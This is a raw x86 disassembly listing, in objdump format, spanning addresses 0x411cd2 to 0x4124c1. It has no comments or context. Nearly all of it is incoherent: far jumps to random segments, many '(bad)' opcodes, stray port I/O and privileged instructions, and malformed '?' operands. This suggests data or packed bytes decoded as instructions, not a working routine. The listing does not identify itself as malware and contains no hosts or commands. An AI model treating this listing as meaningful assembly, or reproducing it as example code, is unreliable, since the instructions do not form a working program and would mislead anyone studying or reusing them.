  411cd2:	ins    DWORD PTR es:[edi],dx
  411cd3:	mov    al,0xbd
  411cd5:	lds    esp,FWORD PTR [edx]
  411cd7:	jmp    0xfbe4:0x758fcbc5
  411cde:	xor    eax,0x43234398
  411ce3:	mov    esp,0xb19908b1
  411ce8:	jb     0x411cb9
  411cea:	adc    eax,0x685fd52e
  411cef:	stc    
  411cf0:	xchg   ecx,eax
  411cf1:	sbb    al,0xf2
  411cf3:	mov    bh,ch
  411cf5:	(bad)  
  411cf6:	jo     0x411c7b
  411cf8:	mov    eax,ds:0xcd046fc4
  411cfd:	or     edx,eax
  411cff:	xor    al,0x32
  411d01:	and    DWORD PTR [ebp+0x5c1302a1],ebp
  411d07:	jmp    0xbbf8:0x10f4642
  411d0e:	test   DWORD PTR [ebp-0x1c],ecx
  411d11:	inc    ebx
  411d12:	lods   al,BYTE PTR ds:[esi]
  411d13:	iret   
  411d14:	shr    DWORD PTR [ebp+0x5a292f36],0x49
  411d1b:	(bad)
  411d1e:	jl     0x411d79
  411d20:	sbb    ecx,DWORD PTR es:[ebx-0x54]
  411d24:	aam    0x31
  411d26:	fmul   st,st(2)
  411d28:	ss mov ecx,0x9ac3aa62
  411d2e:	not    BYTE PTR [ebx]
  411d30:	push   ebp
  411d31:	xor    esp,DWORD PTR [edx]
  411d33:	mov    al,0xbf
  411d35:	push   ecx
  411d36:	aaa    
  411d37:	mov    dh,0x9d
  411d39:	mov    ecx,DWORD PTR ds:0xa9112e35
  411d3f:	sbb    bh,BYTE PTR [edi+0x52d94425]
  411d45:	paddsb mm4,QWORD PTR [ecx]
  411d48:	xor    esi,DWORD PTR [edi]
  411d4a:	sub    ch,bl
  411d4c:	cmc    
  411d4d:	cmc    
  411d4e:	add    ebp,DWORD PTR [esi+ecx*8-0x139c5678]
  411d55:	sub    esp,DWORD PTR [ecx-0x15750aca]
  411d5b:	sub    eax,0x93aafde5
  411d60:	push   ss
  411d61:	repz jmp 0xfb0008f4
  411d67:	jge    0x411d38
  411d69:	sahf   
  411d6a:	cmp    eax,eax
  411d6c:	ret    0xa797
  411d6f:	(bad)  
  411d70:	and    BYTE PTR [ecx+0x51],0xea
  411d74:	fisubr DWORD PTR [esi]
  411d76:	aaa    
  411d77:	out    0x9,al
  411d79:	cmp    ebx,DWORD PTR [eax]
  411d7b:	mov    edx,0xf1951206
  411d80:	push   ds
  411d81:	or     edi,edi
  411d83:	pop    ds
  411d84:	mov    DWORD PTR [ecx],edi
  411d86:	jle    0x411d5e
  411d88:	push   0xffffff9e
  411d8a:	dec    ecx
  411d8b:	(bad)  
  411d8c:	aad    0x16
  411d8e:	fisub  DWORD PTR [ebx-0x69]
  411d91:	xor    ebx,edx
  411d93:	aaa    
  411d94:	das    
  411d95:	mov    ecx,ebx
  411d97:	mov    edx,0x5781a8ff
  411d9c:	stos   BYTE PTR es:[edi],al
  411d9d:	xor    bh,0xd2
  411da0:	and    eax,0x6527e61a
  411da5:	dec    esp
  411da6:	add    esp,DWORD PTR [eax+ebx*2+0x5c]
  411daa:	pushf  
  411dab:	inc    ecx
  411dac:	pop    edx
  411dad:	mov    edi,eax
  411daf:	jmp    0x7850:0x8ee0e1fe
  411db6:	xor    BYTE PTR [eax+edx*1-0x73],0xeb
  411dbb:	pop    ecx
  411dbc:	cmp    al,0x4a
  411dbe:	repz dec ecx
  411dc0:	stc    
  411dc1:	retf   
  411dc2:	push   esi
  411dc3:	xchg   ebx,eax
  411dc4:	xor    DWORD PTR [edx+0x77827a3f],esp
  411dca:	test   eax,0x41ba00f1
  411dcf:	rol    DWORD PTR [esi+0x55],0xe6
  411dd3:	sub    DWORD PTR [ecx+eiz*2-0x3c],esi
  411dd7:	leave  
  411dd8:	ret    
  411dd9:	leave  
  411dda:	xor    edx,DWORD PTR [esi-0x5c]
  411ddd:	mov    WORD PTR [ecx+edx*8],?
  411de0:	ja     0x411e45
  411de2:	fisttp QWORD PTR [ebx+0x7b152b4f]
  411de8:	outs   dx,BYTE PTR ds:[esi]
  411de9:	and    esp,DWORD PTR [ebx-0x37]
  411dec:	mov    ebp,0xe6573b7
  411df1:	dec    ebx
  411df2:	pop    ecx
  411df3:	sbb    DWORD PTR [ebx+0x39],edi
  411df6:	push   ecx
  411df7:	and    bl,0x1d
  411dfa:	or     eax,DWORD PTR [edx-0x48]
  411dfd:	jl     0x411de9
  411dff:	lea    edi,[esi+0x36]
  411e02:	repnz retfw 
  411e05:	adc    bh,ch
  411e07:	mov    ch,0xc0
  411e09:	fisubr DWORD PTR [eax]
  411e0b:	jnp    0x411e5f
  411e0d:	sbb    ebp,eax
  411e0f:	xchg   ebx,esi
  411e11:	xchg   esi,ebx
  411e13:	fsincos 
  411e15:	fcom   DWORD PTR [ebp+0x4ab795e]
  411e1b:	xchg   edx,eax
  411e1c:	sbb    DWORD PTR [edi-0x2f],0xe623c756
  411e23:	aas    
  411e24:	ins    DWORD PTR es:[edi],dx
  411e25:	and    DWORD PTR [ebp+0x3c207f67],ebp
  411e2b:	jle    0x411dc4
  411e2d:	bnd jne 0x411e18
  411e30:	xor    DWORD PTR [ebp-0x62],esp
  411e33:	pop    ss
  411e34:	ss icebp 
  411e36:	and    ch,BYTE PTR [edi]
  411e38:	popa   
  411e39:	lahf   
  411e3a:	repnz cmp BYTE PTR ds:0x1fc3e420,0x6
  411e42:	pop    es
  411e43:	jge    0x411e26
  411e45:	adc    bh,BYTE PTR [edx]
  411e47:	or     DWORD PTR [esi+edx*2],0x9434de57
  411e4e:	cdq    
  411e4f:	aaa    
  411e50:	aad    0x11
  411e52:	adc    ecx,DWORD PTR [edi+0x1c]
  411e55:	leave  
  411e56:	stc    
  411e57:	mov    dh,BYTE PTR [ebx+0x54]
  411e5a:	inc    eax
  411e5b:	sub    DWORD PTR [ebp+0x2e],edx
  411e5e:	loope  0x411ece
  411e60:	fsub   QWORD PTR [esi+0x56b482c1]
  411e66:	dec    esi
  411e67:	aaa    
  411e68:	pop    esp
  411e69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e6a:	rcl    DWORD PTR [ebp-0x12],1
  411e6d:	pop    ebp
  411e6e:	or     bh,BYTE PTR [edx]
  411e70:	jbe    0x411ecb
  411e72:	mov    ebx,0x2aa1d481
  411e77:	int    0xd5
  411e79:	out    dx,al
  411e7a:	cmp    esp,ebx
  411e7c:	dec    edi
  411e7d:	add    esi,0xffffffdc
  411e80:	(bad)  
  411e81:	call   0xdd0357b4
  411e86:	xor    eax,0xb491aca8
  411e8b:	mov    ah,0x8a
  411e8d:	add    al,0xf6
  411e8f:	in     al,dx
  411e90:	or     eax,0x6bb4046a
  411e95:	adc    edx,DWORD PTR [eax]
  411e97:	xlat   BYTE PTR ds:[ebx]
  411e98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e99:	(bad)  
  411e9a:	call   0x4ff9eb79
  411e9f:	adc    ebx,edi
  411ea1:	test   eax,ebx
  411ea3:	arpl   WORD PTR [edx-0x17f22664],sp
  411ea9:	arpl   WORD PTR ds:0xc0d64c5b,si
  411eaf:	lods   eax,DWORD PTR ds:[esi]
  411eb0:	mov    edi,0xd8af8abe
  411eb5:	sub    ecx,ebx
  411eb7:	mov    esp,0x45e5cc73
  411ebc:	lods   eax,DWORD PTR ds:[esi]
  411ebd:	inc    esp
  411ebe:	mov    bl,0xb5
  411ec0:	dec    eax
  411ec1:	test   eax,0xe48ac560
  411ec6:	cmp    DWORD PTR [eax+0x77ff8aff],0x49
  411ecd:	xchg   BYTE PTR [edi-0x1b],al
  411ed0:	sahf   
  411ed1:	jl     0x411ef4
  411ed3:	imul   edi,DWORD PTR [ebp+0x47],0x47
  411ed7:	adc    eax,0x7914aa91
  411edc:	push   edx
  411edd:	dec    esi
  411ede:	jp     0x411efb
  411ee0:	inc    esi
  411ee1:	int    0x8f
  411ee3:	and    DWORD PTR [ebp-0x15],edi
  411ee6:	daa    
  411ee7:	mov    ds:0xf5380daa,al
  411eec:	rcl    DWORD PTR [esi-0x14],1
  411eef:	pop    edx
  411ef0:	test   BYTE PTR [eax-0x19],ah
  411ef3:	pushf  
  411ef4:	adc    BYTE PTR [ebx+ecx*2+0x1fe3d97b],dh
  411efb:	push   ds
  411efc:	lea    ebx,[edi+0x4b]
  411eff:	mov    edx,DWORD PTR [ecx]
  411f01:	xor    ch,ah
  411f03:	mov    edi,0x7d87d295
  411f08:	and    al,0x2a
  411f0a:	mov    ch,0xd4
  411f0c:	(bad)  
  411f0d:	mov    eax,0x466cba3e
  411f12:	xchg   BYTE PTR [edx-0x3fe0b7ff],ah
  411f18:	nop
  411f19:	mov    cl,0x45
  411f1b:	xchg   ebx,eax
  411f1c:	push   ss
  411f1d:	xchg   BYTE PTR [ebx-0x53],bh
  411f20:	inc    edx
  411f21:	aad    0x1
  411f23:	pop    ecx
  411f24:	xchg   ebp,eax
  411f25:	jns    0x411f25
  411f27:	test   al,0x5e
  411f29:	push   0xc45d5cbd
  411f2e:	sub    DWORD PTR ss:[ebx],esi
  411f31:	push   edi
  411f32:	loope  0x411f7a
  411f34:	fwait
  411f35:	lds    edi,FWORD PTR [edx-0x61]
  411f38:	or     al,0x66
  411f3a:	retf   0x327e
  411f3d:	xor    al,0x88
  411f3f:	jns    0x411ed3
  411f41:	int    0x87
  411f43:	and    DWORD PTR [ebx+0x2ebd219a],edi
  411f49:	mov    edx,0xe09b0ed6
  411f4e:	inc    ebp
  411f4f:	cmp    DWORD PTR [edi],esp
  411f51:	and    cl,BYTE PTR [esi-0x4bd10bc8]
  411f57:	mov    ah,0x5
  411f59:	fcomp  DWORD PTR [edx]
  411f5b:	icebp  
  411f5c:	add    bl,BYTE PTR [esi+0x20]
  411f5f:	(bad)  
  411f60:	fwait
  411f61:	mov    al,0xc7
  411f63:	cvtps2pd xmm7,QWORD PTR [esp+ebp*4+0xe67ba5d]
  411f6b:	and    eax,0x71319b2
  411f70:	push   ds
  411f71:	mov    al,0xc8
  411f73:	mov    bl,BYTE PTR [ebp+0x63e20d86]
  411f79:	xchg   esp,eax
  411f7a:	pop    esp
  411f7b:	dec    edi
  411f7c:	mov    ecx,0x819e8553
  411f81:	jmp    0x9c31:0x7cf0e2ea
  411f88:	and    al,BYTE PTR [ecx+0x62]
  411f8b:	retf   0x3b8c
  411f8e:	xor    eax,0x9680235b
  411f93:	popf   
  411f94:	mov    bl,0xf5
  411f96:	xchg   ebp,eax
  411f97:	xor    al,0xcf
  411f99:	adc    BYTE PTR [edi],cl
  411f9b:	xor    dh,BYTE PTR [edx-0x452d7c8]
  411fa1:	std    
  411fa2:	xor    edi,DWORD PTR [ebp-0x4a8438c0]
  411fa8:	fdivr  st(1),st
  411faa:	rcr    BYTE PTR [esi+0x7f4f4c02],1
  411fb0:	aam    0x8b
  411fb2:	inc    edx
  411fb3:	popf   
  411fb4:	or     eax,0xf8da9e37
  411fb9:	icebp  
  411fba:	out    dx,eax
  411fbb:	xchg   edx,eax
  411fbc:	fist   DWORD PTR [edi+0x75]
  411fbf:	push   ecx
  411fc0:	add    cl,BYTE PTR [edx-0x10]
  411fc3:	mov    edi,ebx
  411fc5:	mov    dh,cl
  411fc7:	xor    cl,al
  411fc9:	(bad)  
  411fca:	or     eax,0x1a5b4f6d
  411fcf:	jp     0x41204e
  411fd1:	sbb    eax,DWORD PTR [ebp-0x44]
  411fd4:	mov    ss,WORD PTR [ebx+0x7f23c814]
  411fda:	and    BYTE PTR [eax],al
  411fdc:	and    eax,0xf9d7626f
  411fe1:	push   es
  411fe2:	inc    eax
  411fe3:	or     eax,0xf94c16b6
  411fe8:	(bad)  
  411fea:	ds xor eax,0xea67dec
  411ff0:	aaa    
  411ff1:	mov    eax,0x29c03493
  411ff6:	shl    BYTE PTR [eax+eax*4],1
  411ff9:	fdivrp st(7),st
  411ffb:	jns    0x411f97
  411ffd:	repnz repnz push 0x49175e6c
  412004:	popf   
  412005:	lods   al,BYTE PTR ds:[esi]
  412006:	shl    DWORD PTR [ebx],1
  412008:	inc    edi
  412009:	sub    eax,0x6cc9b849
  41200e:	or     eax,0x7d2899c3
  412013:	xlat   BYTE PTR ds:[ebx]
  412014:	add    BYTE PTR [edi-0x93e6879],ah
  41201a:	xor    bl,BYTE PTR [ecx+0x35]
  41201d:	retf   
  41201e:	cwde   
  41201f:	mul    DWORD PTR [eax]
  412021:	sub    eax,0xf440f106
  412026:	cli    
  412027:	jmpw   0x8294
  41202b:	enter  0x4891,0x4b
  41202f:	sahf   
  412030:	push   0x2f
  412032:	cdq    
  412033:	xchg   edi,eax
  412034:	xchg   ebx,eax
  412035:	and    al,BYTE PTR [esi-0xc5405b0]
  41203b:	and    al,0xa3
  41203d:	aas    
  41203e:	repnz stos DWORD PTR es:[edi],eax
  412040:	inc    esp
  412041:	outs   dx,BYTE PTR ds:[esi]
  412042:	sub    BYTE PTR [ecx+ecx*2+0x649982f0],0x55
  41204a:	mov    BYTE PTR [ecx+0x77],dh
  41204d:	xor    dl,BYTE PTR [ecx-0x24]
  412050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412051:	ret    
  412052:	xchg   esp,eax
  412053:	ror    BYTE PTR [ecx+0x6b],cl
  412056:	or     DWORD PTR [esi+0x67],edx
  412059:	test   BYTE PTR [ebx+0x679c7f55],cl
  41205f:	mov    es,WORD PTR ds:0x6554e42c
  412065:	clc    
  412066:	into   
  412067:	mov    al,0xe3
  412069:	cmp    BYTE PTR [eax+0x17],bh
  41206c:	sub    BYTE PTR [ebp-0x8],cl
  41206f:	xchg   esp,eax
  412070:	bound  edi,QWORD PTR [edx+edx*4-0x6bad525]
  412077:	jb     0x4120d4
  412079:	mov    BYTE PTR [esi+0x4481cca3],ah
  41207f:	inc    esp
  412080:	es mov ds,ecx
  412083:	std    
  412084:	(bad)  
  412085:	add    BYTE PTR [ebx],al
  412087:	xchg   edx,eax
  412088:	xor    bl,BYTE PTR [ecx+0x147218d8]
  41208e:	push   edi
  41208f:	mov    WORD PTR [ebp+0x7f85740e],?
  412095:	and    BYTE PTR [ebp-0x21f32623],dl
  41209b:	stos   DWORD PTR es:[edi],eax
  41209c:	or     DWORD PTR [eax],edx
  41209e:	repz das 
  4120a0:	jo     0x412046
  4120a2:	sub    BYTE PTR [edx],dl
  4120a4:	(bad)  
  4120a5:	push   ss
  4120a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120a7:	add    BYTE PTR [ebx-0x32],0xa2
  4120ab:	sub    al,0xfa
  4120ad:	not    BYTE PTR [esp+eax*1-0x1dc45b21]
  4120b4:	dec    ecx
  4120b5:	xor    ah,cl
  4120b7:	dec    sp
  4120b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120ba:	xor    eax,0x8f128183
  4120bf:	xor    eax,0xa390ab20
  4120c4:	jmp    0x4120f6
  4120c6:	mov    al,0x5f
  4120c8:	push   ds
  4120c9:	mov    al,ds:0x6e4761d4
  4120ce:	pop    esi
  4120cf:	enter  0x1797,0x69
  4120d3:	xchg   ebp,eax
  4120d4:	fdiv   QWORD PTR [esi]
  4120d6:	fadd   st(4),st
  4120d8:	mov    al,ds:0xf90c2a0b
  4120dd:	adc    al,0xec
  4120df:	inc    ebp
  4120e0:	xor    ebx,esi
  4120e2:	aaa    
  4120e3:	sub    eax,0x3c10bc5
  4120e8:	dec    ebx
  4120e9:	sbb    bl,BYTE PTR [eax+0x595c45a1]
  4120ef:	lods   al,BYTE PTR cs:[esi]
  4120f1:	rcr    edx,cl
  4120f3:	mov    eax,ds:0xd0dc2646
  4120f8:	cmp    DWORD PTR [edi],ebp
  4120fa:	dec    ebp
  4120fb:	xchg   esi,eax
  4120fc:	call   0xc582237c
  412101:	xlat   BYTE PTR ds:[ebx]
  412102:	aas    
  412103:	adc    al,0xfd
  412105:	mov    dh,0x40
  412107:	jp     0x41217b
  412109:	push   0x28
  41210b:	pop    ss
  41210c:	outs   dx,BYTE PTR ds:[esi]
  41210d:	mov    edx,0xe6313eea
  412112:	iret   
  412113:	xor    al,0xd
  412115:	or     eax,0x5465dce1
  41211a:	pop    edi
  41211b:	xor    eax,0xe9080e73
  412120:	ror    esp,0x4c
  412123:	fcomp  DWORD PTR [edx-0x43]
  412126:	jns    0x412155
  412128:	sti    
  412129:	mov    cs,WORD PTR [ecx-0x61]
  41212c:	rcr    BYTE PTR [ecx],1
  41212e:	jecxz  0x4121a4
  412130:	daa    
  412131:	sub    edx,DWORD PTR [esp+ebx*8-0x724d4844]
  412138:	popf   
  412139:	cwde   
  41213a:	lods   al,BYTE PTR ds:[esi]
  41213b:	xchg   edi,eax
  41213c:	jle    0x412181
  41213e:	fdivr  QWORD PTR [ebp-0x4c]
  412142:	cmp    DWORD PTR [esi],esi
  412144:	rol    DWORD PTR [eax+eiz*2+0x1c607ddd],0x97
  41214c:	xlat   BYTE PTR ds:[ebx]
  41214d:	sbb    eax,0xce49bdcc
  412152:	xchg   dl,dl
  412154:	stos   DWORD PTR es:[edi],eax
  412155:	cmp    esp,DWORD PTR ds:0xf9efd6da
  41215b:	into   
  41215c:	sbb    al,0xa8
  41215e:	xchg   edi,eax
  41215f:	xchg   ebp,eax
  412160:	dec    esp
  412161:	loop   0x4120f4
  412163:	push   esp
  412164:	cwde   
  412165:	sub    bh,ch
  412167:	(bad)  
  412168:	scas   al,BYTE PTR es:[edi]
  412169:	dec    edi
  41216a:	cld    
  41216b:	mov    dh,0xa3
  41216d:	in     al,dx
  41216e:	mov    edx,DWORD PTR [edi]
  412170:	cli    
  412171:	cli    
  412172:	call   0x8d24a539
  412177:	dec    ebx
  412178:	push   esi
  412179:	xor    esp,DWORD PTR [esi+0x155a589f]
  41217f:	in     eax,0x17
  412181:	enter  0x26ff,0xae
  412185:	push   0x34
  412187:	push   cs
  412188:	xor    edx,0xffffffd8
  41218b:	call   0x9692f85e
  412190:	mov    eax,0x355ceeab
  412195:	lods   al,BYTE PTR ds:[esi]
  412196:	xlat   BYTE PTR ds:[ebx]
  412197:	clc    
  412198:	and    BYTE PTR [ebp+edi*2+0x2788abcc],0xcf
  4121a0:	retf   
  4121a1:	addr16 pop ss
  4121a3:	popa   
  4121a4:	push   esi
  4121a5:	or     BYTE PTR [edi+0x7367c359],bl
  4121ab:	cmp    ebp,DWORD PTR [esi+0x7e]
  4121ae:	or     eax,0x77aa46f6
  4121b3:	pushf  
  4121b4:	out    0x3b,eax
  4121b6:	lock fmul QWORD PTR [esi]
  4121b9:	sub    al,0x10
  4121bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121bc:	cwde   
  4121bd:	inc    eax
  4121be:	push   esi
  4121bf:	pop    ecx
  4121c0:	pusha  
  4121c1:	repz std 
  4121c3:	fidivr DWORD PTR [esi-0x6a]
  4121c6:	iret   
  4121c7:	cmp    ch,bl
  4121c9:	shl    DWORD PTR [esi],0xeb
  4121cc:	push   eax
  4121cd:	ret    
  4121ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121cf:	jmp    0x412186
  4121d1:	pop    edi
  4121d2:	lods   eax,DWORD PTR ds:[esi]
  4121d3:	mov    esi,0xfeef7589
  4121d8:	xchg   esp,eax
  4121d9:	icebp  
  4121da:	sbb    al,0x4d
  4121dc:	mov    edi,0x99a830c6
  4121e1:	push   cs
  4121e2:	mov    ds:0xfc0dcac8,eax
  4121e7:	mov    cl,0x4d
  4121e9:	lock xor cl,bh
  4121ec:	sub    edx,DWORD PTR [ebx-0x522fbaae]
  4121f2:	enter  0x5dbb,0x1f
  4121f6:	aad    0x90
  4121f8:	xchg   edi,ecx
  4121fa:	cdq    
  4121fb:	add    DWORD PTR [edx-0x36d07563],edi
  412201:	sub    eax,0x586040f9
  412206:	repnz aam 0x24
  412209:	mov    dh,0x78
  41220b:	mov    al,ds:0x105202c3
  412210:	xlat   BYTE PTR ds:[ebx]
  412211:	neg    BYTE PTR [ecx+0x60419116]
  412217:	xchg   ecx,eax
  412218:	jmp    0x1c44:0x5b9ea913
  41221f:	add    DWORD PTR ds:0x28369c03,eax
  412225:	add    al,0xc4
  412227:	push   0xffffff9b
  412229:	sbb    al,0x39
  41222b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41222c:	aas    
  41222d:	jnp    0x4121f7
  41222f:	fcmovb st,st(1)
  412231:	xchg   ebp,eax
  412232:	cmp    al,0xa8
  412234:	idiv   BYTE PTR [edi]
  412236:	xchg   ebp,eax
  412237:	std    
  412238:	xor    al,0x91
  41223a:	or     al,0x66
  41223c:	mov    bl,0xe9
  41223e:	cld    
  41223f:	in     al,dx
  412240:	pushf  
  412241:	or     BYTE PTR [ebp-0x1d5f6c7e],ah
  412247:	scas   al,BYTE PTR es:[edi]
  412248:	push   ds
  412249:	ja     0x412212
  41224b:	pop    edx
  41224c:	inc    ebp
  41224d:	in     al,dx
  41224e:	mov    eax,ds:0xd8abf158
  412253:	dec    edx
  412254:	into   
  412255:	icebp  
  412256:	push   0x1e
  412258:	mov    dh,0x20
  41225a:	mov    eax,ds:0x82ecc0d0
  41225f:	mov    al,ds:0xbdf0d98
  412264:	fwait
  412265:	pop    ss
  412266:	sub    eax,0xa18f2ed1
  41226b:	inc    edi
  41226c:	cdq    
  41226d:	ret    
  41226e:	adc    bl,al
  412270:	xor    esp,DWORD PTR [edi]
  412272:	das    
  412273:	pop    ebx
  412274:	jge    0x41225c
  412276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412277:	adc    BYTE PTR [ebx+edx*8],0xf6
  41227b:	cld    
  41227c:	mul    BYTE PTR [ecx-0x996ff0c]
  412282:	mov    edx,0x990cd83b
  412287:	sar    BYTE PTR [esi+0x61a356a],cl
  41228d:	mov    ds:0x301e61dd,eax
  412292:	xchg   ebp,eax
  412293:	fprem  
  412295:	mov    bh,0x45
  412297:	fwait
  412298:	int3   
  412299:	shl    BYTE PTR [eax],cl
  41229b:	xor    eax,0x914a0f43
  4122a0:	jno    0x4122d8
  4122a2:	shl    bh,1
  4122a4:	fidiv  WORD PTR [edi]
  4122a6:	sbb    DWORD PTR [ecx-0x2a],ebp
  4122a9:	(bad)  
  4122aa:	retf   
  4122ab:	add    eax,0x3d560785
  4122b0:	pop    esp
  4122b1:	cdq    
  4122b2:	adc    DWORD PTR [ebp-0x5cd213b8],0xffffffe8
  4122b9:	aam    0x5a
  4122bb:	hlt    
  4122bc:	jne    0x41232b
  4122be:	adc    al,0xfe
  4122c0:	pop    ebx
  4122c1:	sahf   
  4122c2:	and    eax,0x6fde4df0
  4122c7:	int    0xf2
  4122c9:	adc    dl,dl
  4122cb:	out    0xfa,al
  4122cd:	(bad)  
  4122ce:	mov    eax,DWORD PTR [edi]
  4122d0:	repz xor eax,0x66e91983
  4122d6:	adc    al,0x76
  4122d8:	jg     0x41225e
  4122da:	mov    al,0x4c
  4122dc:	dec    eax
  4122dd:	mov    eax,0xb448cf3f
  4122e2:	jle    0x4122f8
  4122e4:	inc    edi
  4122e5:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4122e7:	mov    esp,0x677a79fc
  4122ec:	cmc    
  4122ed:	lock xchg esi,eax
  4122ef:	xlat   BYTE PTR ds:[ebx]
  4122f0:	gs push edx
  4122f2:	repnz xchg esp,eax
  4122f4:	int    0x78
  4122f6:	imul   ebx,DWORD PTR [ebx+0x1ef5aa78],0x6e1b6203
  412300:	ficomp DWORD PTR [edx-0x3ef2b02]
  412306:	cmp    ecx,ecx
  412308:	jne    0x412333
  41230a:	sar    BYTE PTR [edi],cl
  41230c:	xchg   ebx,eax
  41230d:	(bad)  
  41230e:	out    0xdb,al
  412310:	inc    esi
  412311:	fimul  WORD PTR [edi+0x443fd9e0]
  412317:	xchg   ecx,eax
  412318:	jae    0x41238e
  41231a:	outs   dx,BYTE PTR ds:[esi]
  41231b:	cmp    BYTE PTR [esi],0x73
  41231e:	imul   esi,DWORD PTR [eax-0x55332c19],0xcf26b692
  412328:	into   
  412329:	sub    ah,BYTE PTR [esi+0x32011822]
  41232f:	add    ch,bl
  412331:	fdiv   DWORD PTR [edx+0x59]
  412334:	or     bh,ch
  412336:	lods   al,BYTE PTR ds:[esi]
  412337:	dec    esp
  412338:	daa    
  412339:	jle    0x412336
  41233b:	scas   eax,DWORD PTR es:[edi]
  41233c:	sub    DWORD PTR [edx-0x29],ebx
  41233f:	call   0x45b2:0xd63b855e
  412346:	cmp    BYTE PTR [edi],0xef
  412349:	xchg   eax,esp
  41234b:	ja     0x4122ff
  41234d:	in     eax,dx
  41234e:	scas   al,BYTE PTR es:[edi]
  41234f:	mov    ds:0x3026e4f8,eax
  412354:	imul   esi,DWORD PTR [eax],0x74
  412357:	adc    BYTE PTR [ebp-0x108e0129],dh
  41235d:	dec    ebx
  41235e:	and    ecx,esi
  412360:	and    eax,0xc892fd32
  412365:	js     0x4122fe
  412367:	cmp    bh,BYTE PTR [ebp+0x68]
  41236a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41236b:	jns    0x41236d
  41236d:	mov    bl,0xa0
  41236f:	mov    ch,0x24
  412371:	xchg   ebp,eax
  412372:	jle    0x4122fd
  412374:	std    
  412375:	xor    eax,0x7fad8f94
  41237a:	jbe    0x41235f
  41237c:	jb     0x4123c4
  41237e:	cmp    DWORD PTR [esp+ebx*4+0x35],edx
  412382:	sbb    eax,0x44efd6c5
  412387:	inc    edi
  412388:	mov    DWORD PTR [edx+0x64122bf2],0x9dcc1137
  412392:	bound  eax,QWORD PTR [ebp+0x3a71248a]
  412398:	out    dx,eax
  412399:	addr16 into 
  41239b:	loop   0x412382
  41239d:	fucomp st(0)
  41239f:	add    BYTE PTR [ebx],ah
  4123a1:	pop    ebx
  4123a2:	pop    es
  4123a3:	sahf   
  4123a4:	dec    edi
  4123a5:	test   BYTE PTR [esi],bh
  4123a7:	pop    DWORD PTR [eax-0x76e9b0a8]
  4123ad:	rcl    DWORD PTR [ebp-0x41],1
  4123b0:	fs or  edx,0x58c880f9
  4123b7:	cmp    eax,0xb3ba5dba
  4123bc:	pop    ebx
  4123bd:	xchg   ebp,eax
  4123be:	int    0x49
  4123c0:	aam    0x2c
  4123c2:	mov    WORD PTR [eax+0x134910c5],?
  4123c8:	cmc    
  4123c9:	mov    ebx,0x2497b9e9
  4123ce:	es jno 0x4123c9
  4123d1:	cmp    eax,0xc26efb3c
  4123d6:	pop    ebp
  4123d7:	shl    bh,1
  4123d9:	jns    0x412426
  4123db:	cmp    ebx,DWORD PTR [ebx]
  4123dd:	std    
  4123de:	and    esp,esi
  4123e0:	loope  0x412430
  4123e2:	push   cs
  4123e3:	xor    DWORD PTR [esi],0xa
  4123e6:	out    0x6c,eax
  4123e8:	ror    BYTE PTR [esi],1
  4123ea:	jne    0x412384
  4123ec:	mov    bh,0xb2
  4123ee:	repnz mov esi,DWORD PTR [ebx-0x5345c989]
  4123f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123f6:	and    eax,0xd954e0c2
  4123fb:	adc    DWORD PTR [edx+0x387624fb],0x27f27f68
  412405:	xchg   esp,eax
  412406:	rcl    ebp,1
  412408:	xchg   ebx,eax
  412409:	jl     0x412438
  41240b:	mov    gs,WORD PTR [edi-0x16ae0dd4]
  412411:	and    cl,BYTE PTR [ecx+0x73]
  412414:	and    BYTE PTR [esi],0x2b
  412417:	popf   
  412418:	fst    st(1)
  41241a:	sub    bl,bh
  41241c:	mov    esp,0x6fe5d2d5
  412421:	test   dl,bl
  412423:	mov    ch,0xc5
  412425:	data16 jge 0x412429
  412428:	xchg   edi,eax
  412429:	cmp    al,0x54
  41242b:	jle    0x4124a5
  41242d:	pusha  
  41242e:	loop   0x4123f9
  412430:	jl     0x4124b0
  412432:	dec    eax
  412433:	add    DWORD PTR [eax+0x7b8bebd0],eax
  412439:	jbe    0x412489
  41243b:	out    0xf3,al
  41243d:	jnp    0x4123e3
  41243f:	rol    BYTE PTR [ebx],0xc5
  412442:	imul   esi,ebp,0x5acfedc5
  412448:	add    BYTE PTR [edx+0x14edeace],cl
  41244e:	pusha  
  41244f:	pop    esi
  412450:	call   0x50f3:0x4a76383d
  412457:	(bad)  
  412458:	xchg   ecx,eax
  412459:	inc    eax
  41245b:	sti    
  41245c:	xchg   DWORD PTR [edi-0x49],edx
  41245f:	out    dx,eax
  412460:	gs out 0xeb,eax
  412463:	dec    ebx
  412464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412465:	or     dh,dl
  412467:	(bad)  
  412468:	div    esi
  41246a:	popa   
  41246b:	push   eax
  41246c:	aas    
  41246d:	xchg   esi,eax
  41246e:	jae    0x41243d
  412470:	dec    ebx
  412471:	xor    edi,ebp
  412473:	out    0x87,eax
  412475:	cwde   
  412476:	nop
  412477:	sbb    ch,BYTE PTR [edi+0x66a15dfa]
  41247d:	out    dx,al
  41247e:	test   eax,0x8457d4bb
  412483:	retf   0xde9a
  412486:	or     bl,BYTE PTR [edi]
  412488:	call   0xe374:0xad4cae24
  41248f:	mov    esp,0x35333e1a
  412494:	mov    DWORD PTR [edx],eax
  412496:	fld    QWORD PTR [esi-0x16]
  412499:	xlat   BYTE PTR ds:[ebx]
  41249a:	mov    esi,DWORD PTR [esi+0x61]
  41249d:	das    
  41249e:	add    eax,0xd99c7100
  4124a3:	xor    esp,DWORD PTR [ecx]
  4124a5:	and    BYTE PTR [ecx-0x7048efe4],bl
  4124ab:	push   ebp
  4124ac:	nop
  4124ad:	fimul  DWORD PTR [esi+0x5f]
  4124b0:	xor    eax,0x5a8cce55
  4124b5:	push   0xd3d0e100
  4124ba:	xchg   edx,eax
  4124bb:	mov    BYTE PTR [edx+0x3f],0xfa
  4124bf:	or     bl,dl
  4124c1:	xchg   edx,eax
